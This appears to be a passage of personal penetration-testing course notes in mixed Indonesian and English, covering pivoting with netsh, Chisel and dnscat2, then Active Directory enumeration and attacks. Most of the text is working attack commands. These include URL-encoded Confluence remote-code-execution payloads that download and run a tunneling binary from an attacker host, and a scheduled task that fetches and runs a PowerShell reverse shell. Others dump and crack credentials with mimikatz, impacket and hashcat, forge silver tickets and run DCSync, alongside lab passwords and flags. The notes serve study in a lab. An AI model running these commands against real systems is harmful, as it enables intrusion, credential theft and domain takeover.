3) Check di Kali udah ada localhost hosting di 9833 apa belum
```bash
ss -ntplu
```
4) Kita sekarang udah bisa RDP ke mesinnya lewat 127.0.0.1:9833
```bash
xfreerdp /v:127.0.0.1:9833 /dynamic-resolution /u:rdp_admin  /p:P@ssw0rd! /cert:ignore +clipboard
```

## Port Forwarding Using Netsh (Network Shell)
Netsh: *the built-in firewall configuration tool*
> Using Netsh, we can set up a port forward with the portproxy subcontext within the interface context.
> While Netsh requires administrative privileges to create a port forward on Windows, it can be very useful in some restrictive situations

Scenario: Let's consider a slight modification of the previous scenario. MULTISERVER03 is serving its web application on TCP port 80 on the perimeter. CONFLUENCE01 is no longer accessible on the WAN interface. For simplicity, the firewall on MULTISERVER03 also allows inbound TCP port 3389, meaning we are able to log in over RDP directly. 

We want to SSH into PGDATABASE01 directly from our Kali machine. To do this, we'll need to create a port forward on MULTISERVER03 that will listen on the WAN interface and forward packets to the SSH port on PGDATABASE01.

1) RDP to MULTISERVER03
```bash
xfreerdp /v:192.168.198.64 /dynamic-resolution /u:rdp_admin  /p:P@ssw0rd! /cert:ignore +clipboard
```
2) On Windows machine (MULTISERVER03), run Netsh. (Admin CMD)
We'll instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215)
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.198.64 connectport=22 connectaddress=10.4.198.215
```
> Check apakah sudah tersetup, harusnya ada listening di port 2222
```cmd
netstat -anp TCP | find "2222"
```
> Buat cek port forwarding yang udah kita set
```cmd
netsh interface portproxy show all
```
3) On Kali Machine, harusnya kita masih gk bisa connect ke port 2222 MULTISERVER03. Karena ada firewall rule yang blocking.
```bash
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
>> Bakal filtered krn terblock firewall.
```
>> In order to access it, we need to poke a hole in the firewall on MULTISERVER03.

4) On Windows machine (MULTISERVER03), kita bisa allow inbound ke 192.168.198.64 di port 2222. 
my thought: Tbh, kalo kita bisa mainin firewallnya, kita matiin aja agar gk ush melakukan ini smw wkkw.
```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.198.64 localport=2222 action=allow
```
5) Harusnya kita bisa SSH
```cmd
ssh database_admin@192.168.198.64 -p2222
```
6) Delete firewall, portforwarding rule yang tadi kita buat
```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
7) Delete port forwarding netshnya
```cmd
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.198.64
```

Exercise:
1. RDP
2. netsh interface portproxy add v4tov4 listenport=7777 listenaddress=192.168.198.64 connectport=4545 connectaddress=10.4.198.215
3. netsh advfirewall firewall add rule name="port_forward_gk_jelas_7777" protocol=TCP dir=in localip=192.168.198.64 localport=7777 action=allow
4. ./netsh_exercise_client.bin -i 192.168.198.64 -p 7777 -i 192.168.198.64 -p 7777


# Tunneling Through Deep Packet Inspection (Chisel & dnscat2)

> Deep packet inspection is a technology that's implemented to monitor traffic based on a set of rules. It's most often used on a network perimeter, where it can highlight patterns that are indicative of compromise.
> Deep packet inspection devices may be configured to only allow specific transport protocols into, out of, or across the network. For example, a network administrator could create a rule that terminates any outbound SSH traffic. If they implemented that rule, all connections that use SSH for transport would fail, including any SSH port redirection and tunneling strategies we had implemented.
> How to bypass this? Cuma HTTP yg dikasih lewat

## Dynamic HTTP Tunneling with Chisel

> Chisel, an HTTP tunneling tool that encapsulates our data stream within HTTP. It also uses the SSH protocol within the tunnel so our data will be encrypted.

Scenario: Gk bs revshell ke CONFLUENCE01 krn diblock. Kita harus setup tunnel biar bisa langsung loncatin CONFLUENCE, dan bisa connect ke network POSGRESQLDB

1) Transfer chisel ke CONFLUENCE pake CVE itu.
```bash
Command to send:
wget 192.168.45.168/chisel_amd64 -O /tmp/chisel && chmod +x /tmp/chisel

Exploit command:
curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.168/chisel_amd64%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```
2) Start Chisel server on our Kali
```bash
chisel server --port 8080 --reverse

--reverse = reverse port forward
```
3) Log incoming traffic on port 8080 on our kali Kali
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```
4) Execute chisel client on confluence. Kita mau set socks proxy jg (pivoting, proxychains)
```bash
Command to send:
/tmp/chisel client 192.168.45.168:8080 R:socks > /dev/null 2>&1 & 

Exploit Command:
curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.168:8080%20R:socks%27%29.start%28%29%22%29%7D/
```
>> Di module error krn mereka salah version chisel, jadi mereka ajarin debug pake Curl lalu cek tcpdump.
```bash (Debugging)
Command to send:
/tmp/chisel client 192.168.45.168:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.168:8080/

Exploit command:
curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.168:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.168:8080/%27%29.start%28%29%22%29%7D/
```
>> Lalu mereka transfer ulang version chisel yang bener. Punya gw dah bener dri awal.

5) Check udah ada yg listen di 1080 apa belum
```bash
ss -ntplu
```
6) SSH to Postgresql server.
```bash 
proxychains ssh database_admin@10.4.198.215
```
> HARUSNYA SELESAI DI SINI

7) Module bilang gini:
SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the ProxyCommand configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o.

ProxyCommand accepts a shell command that is used to open a proxy-enabled channel. The documentation suggests using the OpenBSD version of Netcat, which exposes the -X flag and can connect to a SOCKS or HTTP proxy. However, the version of Netcat that ships with Kali doesn't support proxying.

Instead, we'll use Ncat, the Netcat alternative written by the maintainers of Nmap. We can install this on Kali with sudo apt install ncat.

>> PADAHAL BISA proxychains aja.

```cmd
sudo apt install ncat

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.198.215
```

Exercise:
```bash
python3 -m http.server 80

curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.168/chisel_amd64%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

chisel server --port 8080 --reverse

curl http://192.168.198.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.168:8080%20R:socks%27%29.start%28%29%22%29%7D/

proxychains ./chisel_exercise_client -i 10.4.198.215 -p 8008
```

## DNS Tunneling with dnscat2
> Baca penjelasan teorinya di module aja. Harusnya gk relevan buat exam.
> We can use `dnscat2` to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records.
> A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.

> Intinya dia kyk chisel, ada client dan server dan connect berdasarkan domain name. Kalau resolvernya bisa ngeresolve domain yg dicari dns2cat client ke dns2cat servernya. Boom, langsung kyk auto command execution + bisa tunneling jg. Kalo resolvernya bisa nyari nama domainnya sampe jauh bgt, ini sangat OP.

1) SSH ke FELINEAUTHORITY dan set tcpdump buat analisa (kali:7he_C4t_c0ntro11er)
```bash
ssh kali@192.168.198.7
sudo tcpdump -i ens192 udp port 53
```
2) On FELINEAUTHORITY, Jalanin dnscat2-server
```bash
dnscat2-server feline.corp
```
>> Liat server DNS kita jalan di 0.0.0.0:53 (UDP 53)

3) Setelah semua Labnya sudah tersetup. Pivot buat SSH ke PGDATABASE01 dan jalanin dnscat2
```bash
chisel server --socks5 --reverse -p 9999
./chisel_amd64 client 192.168.45.168:9999 R:1080:socks
proxychains ssh database_admin@10.4.198.215
```
4) Jalani dnscat2 di PGDATABASE01
```bash
cd dnscat/
./dnscat feline.corp
```
5) Check lagi ke FELINEAUTHORITY, liat kalo session udah established
>> Ada semacam random secret yang dia create
```
New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:

>> Bait Static Genome Tusked Dash Tusked
```
6) Check tcpdump kita. The dnscat2 process is using CNAME, TXT, and MX queries and responses. As indicated by this network data, DNS tunneling is certainly not stealthy! This output reveals a huge data transfer from the dnscat2 client to the server. 
>> Kill the tcpdump

7) Balik ke dns2cat server (FELINE). Kita bisa interact ke PGDATABASE01 pake clinya
> Pencet enter aja di window yang ada secret 6 kata tadi
```bash
dnscat2> windows
>> Keliatan udah connect ke pgdatabase01 dan dia window nomor brp.
dnscat2> window -i 1
>> Initiate command shell ke window target kita.

command (pgdatabase01) 1> ?
>> Show command apa aja yg bisa kita jalanin.

command (pgdatabase01) 1> listen --help
>> Keliatan kalo listen bekerjanya mirip kyk SSH -L (Local port forwarding)
>> Coba connect SMB port on HRSHARES agar FELINEAUTHORITY bisa connect.

command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.198.217:445
>> Local portforwarding HRSHARES port 445 ke FELINEAUTHORITY port 4455
```
8) Sekarang harusnya FELINEAUTHORITY bisa akses SMB share di HRSHARES lewat 127.0.0.1:445
```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```
Exercise:
command (pgdatabase01) 1> listen 127.0.0.1:7777 172.16.198.217:4646
Kali:
wget 192.168.198.63:8090/exercises/dnscat_exercise_client
scp ./dnscat_exercise_client kali@192.168.198.7:~
chmod +x dnscat_exercise_client
./dnscat_exercise_client -i 127.0.0.1 -p 7777
OS{e474f6861643b3faa36b3f546d925d3b}


# Active Directory (AD)
> Members of Domain Admins are among the most privileged objects in the domain. 
Lab Scenario: Assume Breach, we can RDP

xfreerdp /u:stephanie /d:corp.com /v:192.168.198.75 /p:'LegmanTeamBenzoin!!' /dynamic-resolution /cert:ignore +clipboard

Distinguished Name:
CN=Stephanie,CN=Users,DC=corp,DC=com
CN > Common Name
CN=Users > Common Name for the container where the user object is stored
DC > Domain Component (not Controller)

LDAP Path Structure:
LDAP://HostName[:PortNumber][/DistinguishedName]

## Basic Enumeration

1. Print users in the current domain
```cmd
net user /domain
```
> Administrator biasanya ada "admin" di usernamenya

2. Inspect specific user in the domain 
```cmd
net user jeffadmin /domain
> Local Group Memberships      *Administrators
> Global Group memberships     *Domain Users         *Domain Admins
```
> Keliatan Local Group Memberships dan Global Group Membershipsnya
> Cari siapa yang Domain Admins.

3. Enumerate groups in the current domain
```cmd
net group /domain
```
4. Enumerate members of a group in the current domain
```cmd
net group "Sales Department" /domain
net group "Domain Admins" /domain
```
5. Get Domain Object of the current user
```cmd (powershell)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
>> Dari sini bisa keliatan domain controllernya. Yang `PdcRoleOwner`
>> Making Custom Script
```ps1 function.ps1
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
```cmd
Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"

foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }

$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
$group.properties.member
```

## Enumeration with PowerView (Recommended)
. .\PowerView.ps1

1) Get basic info of the current domain
```cmd
Get-Domain
Get-NetDomain
```
2) List users in the current domain
```cmd
Get-DomainUser
Get-DomainUser -PreauthNotRequired -Verbose | select name >> #ASREPRoastable users
Get-NetUser -PreauthNotRequired -Verbose | select name >> #ASREPRoastable users
>> Buat ASREP langsung ke step yg impacket aja. Impakcet bisa langsung tau mana yg ASREPRoastable.

Get-NetUser -SPN | select name >> #Kerberoastable users
Get-NetUser
Get-NetUser fred
Get-NetUser | select cn (kalo mw tw usernamenya aja) [list potential target]
Get-NetUser | select cn,pwdlastset,lastlogon
```
3) List groups in the current domain
```cmd
Get-DomainGroup
Get-NetGroup 
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
Get-NetGroup "Domain Admins" | select member
```
4) Enumerate Computer object in the domain [PENTING, list potential target]
```cmd
Get-DomainComputer
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-NetComputer web04.corp.com >> computername atau dnshostname nya
```
5) Spray the environment to find local admin access dari user dan computer kita skrng [PENTING]
```cmd
*NEED ADMIN ACCESS*
Find-LocalAdminAccess
```
6) Cari session user yang terlogin (kalau ada user yg terlogin, kita bisa winrm or psremoting kalo ada akses)
```cmd
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
```
>> Kalo denied berarti kita gk ada akses. Makannya harus `Find-LocalAdminAccess` cari di mana user kita admin
```cmd
Get-NetSession -ComputerName client74 -Verbose
```
7) Retrieve the permission for the object we specify in the -Path flag
```cmd
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```
8) PsLoggedOn.exe (relies on Remote Registry service to be enabled on the target)
> Liat user mana aja yang sedang terlogin pada suatu computer
```cmd
.\PsLoggedon.exe \\files04 (terlihat jeff lagi login di sini)
.\PsLoggedon.exe \\web04
.\PsLoggedon.exe \\client74 (terlihat jeffadmin dan stephanie lagi login)
```
9) Enumerating SPN (Service Principal Name)
```cmd
setspn -L iis_service (Non PowerView)

Get-NetUser -SPN | select samaccountname,serviceprincipalname (PowerView)
>> Inget SPN ini bisa diexploit (check catetan crtp Get-SQLInstanceDomain)

nslookup.exe web04.corp.com (output dari Get-NetUser -SPN)
>> Dapet IPnya
```
10) Enumerate ACEs (Access Control Entries) with PowerView (Convert SID to name)
```cmd
Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104 (ObjectSID)
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553 (SID)
```
>> The highest access permission we can have on an object is GenericAll.

11) Enumerate objects on the domain
```cmd
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
```cmd
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
>> stephany ada GenericAll ke "Management Department". Bisa dimanfaatkan. Add stephany ke group itu
```cmd
net group "Management Department" stephanie /add /domain

Get-NetGroup "Management Department" | select member
```
>> stephany is now part of "Management Department"
Cleanup:
net group "Management Department" stephanie /del /domain
Get-NetGroup "Management Department" | select member

12) Enumerate Domain Shares (Bisa ada potential secrets) [PENTING] (enumerate shares)
```cmd
Find-DomainShare
Find-DomainShare -CheckShareAccess (Filter yang cuma accessible ke kita)
```
By default, the SYSVOL folder is mapped to `%SystemRoot%\SYSVOL\Sysvol\domain-name` on the domain controller and **every domain user has access to it**.
```cmd
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```
>> Historically, system administrators often changed local workstation passwords through Group Policy Preferences (GPP)
>> However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on MSDN.
>> Bisa kita decrypt
```bash (On our kali)
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
```cmd
ls \\FILES04\docshare
ls \\FILES04\docshare\docs\do-not-share
cat \\FILES04\docshare\docs\do-not-share\start-email.txt (dapet creds lagi)
```

## Bloodhound - Automated AD Enumeration (#bloodhoud #sharphound)

1) Collect data with SharpHound (SELALU PAKE SHARPHOUND.EXE, LEBIH RELIABLE)
> Tapi kadang yg .exe suka gk bisa, jadi mw gmw pake .ps1 (POWERSHELLNYA JGN LUPA DI -ep BYPASS DULU!)
```cmd
powershell -ep bypass
. .\SharpHound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
>> Transfer zipnya. (kalo ada ssh.exe, pake scp aja. `where scp`)
```cmd
sudo nc -lnv -p 1234 > sharphoundresult.zip
nc64.exe -w 5 192.168.45.168 1234 < "corp audit_20240409072154_BloodHound.zip"

NOTE: PAKE NC SANGAT TIDAK RELIABLE, CARI CARA LAIN. SCP KEK RDP KEK OR SMB
```
2) Start neo4j and start Bloodhound, drag and drop the zip
```cmd
sudo neo4j start
bloodhound
```
>> Kalo Hubungannya ada session atau Admin To harusnya bisa winrs (BISA GW DAH TEST)
```cmd
winrs -r:client74 cmd
```

## Bloodhound Custom Query (Raw Query)
Get all computer
```cmd
MATCH (m:Computer) RETURN m
```
Get all user
```cmd
MATCH (m:User) RETURN m
```
Get all user yang punya active session
```cmd
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```


Capstone: [PENTING, FORCE CHANGE PASSWORD]
1) Stephanie genericall ke Management Department. Kita add aja.
```cmd
net group "Management Department" stephanie /add /domain
```
Management Department is Member of Development Department
Development Department is Member of Sales Department
>> Which means stephanie itu Dev dan Sales juga skrng.

2) First Degree Object Control analysis dari BloodHound, kita genericAll ke user Robert. (#force change password, genericall)
https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword
```cmd (Bnyk hal yg bisa dilakukan, tapi kita reset passwordnya aja)
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'robert' -AccountPassword $NewPassword
```
3) Cari robert ada di mana
```cmd
Get-NetComputer | select operatingsystem,dnshostname
Get-NetSession -ComputerName client74 -Verbose
.\PsLoggedon.exe \\client74
```
4) Gk ada, mungkin lagi gk login. Coba rdp rdp aja.
```cmd
xfreerdp /u:robert /d:corp.com /v:192.168.202.74 /p:'Password123!' /dynamic-resolution /cert:ignore +clipboard /drive:shatternox,.
```
> Ternyata ada di 74.
```cmd
net localgroup administrators
```
> CORP\robert Administrator. Nice.
OS{15a4d9b9727554b168cf8516a1d3bdf3} > Di desktop administrator


# Attacking Active Directory (AD)

##  Password Attacks (Spraying)

1) Checking for account lockout and password policy
>> Penting biar gk ke lockout
```cmd
net accounts
```
>> Lebih aman pake password spraying biar gk kelogout instead of bruting 1 account
```cmd
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin 
```
2) Spraying with Crackmapexec
>> **FLAG --LOCAL-AUTH INI PENTING BGT KARENA HASILNYA BISA BEDA. BISA HARUSNYA PWNED MALAH DIBILANG AUTH FAILURE.**
```cmd
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
crackmapexec smb ips.txt -u pete -p 'Nexus123!' -d corp.com --continue-on-success
proxychains crackmapexec winrm ips.txt -u wario -p 'Mushroom!'
nxc smb ips.txt -u usernames.txt -p passwords.txt --continue-on-success
proxychains nxc rdp ips.txt -u michelle -p 'NotMyPassword0k?' --continue-on-success --local-auth
proxychains nxc rdp ips.txt -u michelle -H hashesh.txt --continue-on-success --local-auth

proxychains nxc smb 10.10.142.154 -u usernames.txt -p hghgib6vHT3bVWf --local-auth
proxychains nxc winrm 10.10.142.154 -u usernames.txt -p hghgib6vHT3bVWf --local-auth
proxychains nxc wmi 10.10.142.154 -u usernames.txt -p hghgib6vHT3bVWf --local-auth 
```
3) Testing access
```cmd
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
nxc smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
```
>> Kalo outputnya ada (Pw3nd!), berarti  the identified credentials has administrative privileges on the target system.
>> Tinggal impacket-smbexec or psexec

4) Spraying with kerbrute
```cmd
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
*If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.*


## AS-REP Roasting (CATETAN CRTP LEBIH LENGKAP) [PENTING]

xfreerdp /u:jeff /d:corp.com /v:192.168.241.75 /p:'HenchmanPutridBonbon11' /dynamic-resolution /cert:ignore +clipboard

>> If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, *it is possible to grab user's crackable AS-REP and brute-force it offline* (AS-REP Roasting).

>>  To identify users with the *enabled AD user account option Do not require Kerberos preauthentication*, we can use PowerView's `Get-DomainUser` function with the option `-PreauthNotRequired` on Windows. On Kali, we can use impacket-GetNPUsers as shown in listing 14 without the -request and -outputfile options.

1) Cari user yang bisa di AS-REP Roasting (Do not require Kerberos preauth enabled)
```cmd (Powerview)
Get-DomainUser -PreauthNotRequired | select name
Get-NetUser -PreauthNotRequired
Get-ASREPHash -UserName VPN1user -Verbose
Invoke-ASREPRoast -Verbose
```
>> Or bisa langsung dapet Hashnya pake Rubeus.exe or Impacket

Linux:
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete

>> -dc-ip (IP domain controllernya)
>> corp.com/pete (USER BUAT KITA AUTHENTICATE, yang kita udah ada akses)
```
Windows:
```cmd
.\Rubeus.exe asreproast /nowrap
```
Hash example:
```
$krb5asrep$23$dave@CORP.COM:605f45acc5ec4cbcbcecc09
....0E4190C02588FBADED757AA87A.....................
```

2) Crack with hashcat or john
```cmd
hashcat --help | grep -i "Kerberos"
```
```cmd
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

john --wordlist=/opt/rockyou.txt hashes.asreproast
```
>> Nanti dapet passwordnya, bisa dipake buat authenticate, RDP, winrm, etc.

Practice:
1) Get Hash
```bash
impacket-GetNPUsers -dc-ip 192.168.241.70 -request -outputfile hashes.asreproast corp.com/jeff

>> Langsung dapet hashnya jane dan dave
```
2) Crack
```cmd
sudo hashcat -m 18200 hashes.asreproast /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

>> dave:Flowers1
>> jane:Summerland1
```

## Kerberoasting [PENTING]
>> Targeting SPN. Abuse Service Ticket to attempt to crack a password of a service account
>> TGS-REP hash.

1) Cari user yang Kerberoastable
```cmd
Get-NetUser -SPN | select name >> #Kerberoastable users
```
>> Or bisa langsung dapet Hashnya pake Rubeus.exe or Impacket

Linux:
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.241.70 corp.com/jeff
sudo impacket-GetUserSPNs -request -dc-ip 192.168.241.70 -outputfile hashes.kerberoast corp.com/jeff

>> Kalo pake -outputfile hashnya gk keliatan, tapi ke store kok di filenya. Check aja.
```
Note: *If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.*

Windows:
```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Hash example:
```
$krb5tgs$23$*pete$CORP.COM$corp.com/pete*$8c29354b
............................54c3f8d0ade21d3a978483
```

2) Crack the hash with hashcat or john
```bash
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 13100 hashes.kerberoast /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

john.exe --wordlist=/opt/wordlists/rockyou.txt hashes.kerberoast
```

## Silver Tickets [PENTING] (Check catetan CRTP)

>> Forge TGS, service ticket. **Use Mimikatz**
>> Cari service yg potentially vulnerable. Makannya harus enumerate SPN.
>> TARGET BIASANYA ADALAH **HTTP/, MSSQL/, CIFS**

1) Check potential services
```cmd
Get-NetUser -SPN
```
>> Biasanya nama accountnya itu gk kyk user biasa. kyk `sqluser`, `iis_service`, etc.
>> Cara confirm kyk di lab `iwr -UseDefaultCredentials http://web04` dgn acc skrng kt no access.

2) Dump NTLM si service accountnya (INGET MIMIKATZ HARUS AS ADMIN CMD OR POWERSHELLNYA)
```cmd
mimikatz.exe "privilege::debug"
mimikatz.exe "sekurlsa::logonpasswords"
mimikatz.exe "lsadump::secrets"
token::elevate

or

Invoke-Mimikatz -Command '"privilege::debug"'
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::secrets"'
```
3) Forge ticket with mimikatz
```cmd
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

or

mimikatz.exe "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin"

Invoke-Mimikatz -Command '
mimikatz.exe "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin"'
```
/sid ==> Domain SID dapetnya dengan jalanin command `whoami /user` tapi gk ambil smw. stop di (-) terakhir.
/target ==> target di host mana SPNnya jalan
/service ==> Servicenya apa? biasanya MSSQL, HTTP, CIFS, or apa la.
/rc4 ==>  NTLM hash of the SPN 
/user ==> This user will be set in the forged ticket. For this example, we'll use jeffadmin. However, we could also use any other domain user since we can set the permissions and groups ourselves. Biasanya `Domain Admins` member ato gk taro aja `Administrator`

4) Confirm ticketnya udah injected within memory
```cmd
klist
>> Inget kalo kebanyakan ticket bisa issue. `klist purge`
```
>> Skrng harusnya kita bisa akses `iwr -UseDefaultCredentials http://web04`
>> INI LARINYA NTAR COMMAND EXECUTION PAKE SCHTASK. Check CRTP notes. BUKAN WINRS. Itu nanti Golden Ticket.
```cmd
schtasks /create /S web04.corp.com /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
```
Exercise:
```cmd
.\mimikatz.exe "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin"
```
(iwr -UseDefaultCredentials http://web04).Content
OS{2ea22e7ef29fe89dd33a087e76b10c5b}


## Domain Controller Synchronization (DCSync attack)
>> Abusing redundancy in a domain

1) DCSync Attack
Windows: 
```cmd
mimikatz.exe "lsadump::dcsync /user:corp\dave"
mimikatz.exe "lsadump::dcsync /user:corp\Administrator"
mimikatz.exe "lsadump::dcsync /user:corp\krbtgt"
```
/user: Targetnya, biasanya sih krbtgt ya (high value target), kyk corp\krbtgt or corp\Administrator

Linux:
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

impacket-secretsdump -just-dc-user administrator corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

@192.168.50.70 >> DC IP
Bisa tambahin -outputfile krbtgt.dcsync
```
>> Get the Hash NTLM

2) Crack the hash (or just opth or pth)
```cmd
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## AD Attack Capstone 1
We have pete:Nexus123!
Goal: Get Maria and login to the DC

1) Try ASREP
```bash
impacket-GetNPUsers -dc-ip 192.168.241.70 -request -outputfile hashes.asreproast corp.com/pete
```
> mike and dave is asreproastable.

2) Try Kerberoasting
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.241.70 -outputfile hashes.kerberoast corp.com/pete
```
> iis_service is kerberoastable

3) Try DCSync to maria
```bash
impacket-secretsdump -just-dc-user maria corp.com/pete:'Nexus123!'@192.168.241.70 -outputfile maria.dcsync
```
> Fail

4) Try to crack mike and dave
```bash
sudo hashcat -m 18200 hashes.asreproast /opt/wordlists/rockyou.txt -r custom.rule --force
```
Mike cracked ==> mike:Darkness1099!

5) Spray credentials
```bash
crackmapexec smb ips.txt -u mike -p 'Darkness1099!' -d corp.com --continue-on-success
nxc smb ips.txt -u mike -p 'Darkness1099!' -d corp.com --continue-on-success
```
> Berhasil ke client74, files04, dc1, web04, dan client75 (Admin)

6) Coba RDP as mike ke 75 dan dump credentials.
```bash
